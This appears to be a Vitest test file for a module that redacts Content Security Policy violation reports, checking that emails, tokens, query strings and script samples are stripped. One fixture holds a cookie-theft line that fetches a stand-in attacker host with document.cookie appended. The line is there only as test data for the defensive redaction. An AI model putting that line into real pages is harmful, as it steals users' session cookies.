import { describe, expect, it } from "vitest";

import {
  extractCspReports,
  redactCspViolationReport,
} from "@/lib/security/csp-violation-redact";

describe("CSP violation redaction", () => {
  it("strips query strings and script samples from evidence", () => {
    const redacted = redactCspViolationReport({
      "csp-report": {
        "document-uri":
          "https://mapable.com.au/login?email=person@example.com&token=secret",
        "blocked-uri": "https://evil.example/x.js?key=abc",
        "violated-directive": "script-src",
        "script-sample":
          "fetch('https://evil.example?cookie='+document.cookie)",
        disposition: "enforce",
        "status-code": 0,
      },
    });

    expect(redacted.documentOrigin).toBe("https://mapable.com.au");
    expect(redacted.blockedUri).toBe("https://evil.example");
    expect(redacted.violatedDirective).toBe("script-src");
    expect(JSON.stringify(redacted)).not.toContain("person@example.com");
    expect(JSON.stringify(redacted)).not.toContain("document.cookie");
    expect(JSON.stringify(redacted)).not.toContain("token=secret");
  });

  it("redacts Reporting API bodies without samples", () => {
    const redacted = redactCspViolationReport({
      type: "csp-violation",
      body: {
        documentURL: "https://preview.example/path?x=1",
        blockedURL: "https://cdn.example/app.js",
        effectiveDirective: "script-src",
        sample: "secret-inline",
      },
    });
    expect(redacted.documentOrigin).toBe("https://preview.example");
    expect(redacted.blockedUri).toBe("https://cdn.example");
    expect(JSON.stringify(redacted)).not.toContain("secret-inline");
  });

  it("extracts single and array payloads", () => {
    expect(extractCspReports({ "csp-report": {} })).toHaveLength(1);
    expect(extractCspReports([{ type: "csp-violation" }, null])).toHaveLength(
      1,
    );
    expect(extractCspReports("nope")).toHaveLength(0);
  });
});
